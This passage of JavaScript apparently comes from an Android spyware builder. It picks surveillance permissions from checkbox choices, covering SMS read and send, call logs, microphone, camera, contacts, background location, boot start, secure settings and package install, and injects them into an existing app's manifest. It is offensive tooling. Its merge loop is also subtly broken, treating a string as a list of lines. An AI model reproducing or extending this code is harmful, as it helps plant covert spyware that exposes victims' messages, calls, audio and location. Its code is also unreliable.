            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }



        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        for (var i = 0; i < permArray.length; i++) {
            var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
            permissionName = permissionName.substring(0, permissionName.indexOf('"'));
            if (firstPart.indexOf(permissionName) == -1) {
                // Check if this is the first permission being added
                if (firstPart.indexOf('uses-permission') == -1) {
                    firstPart = firstPart + "\n" + permArray[i];
                } else {
                    // Add the permission above the first existing permission
                    var index = firstPart.indexOf('<uses-permission');
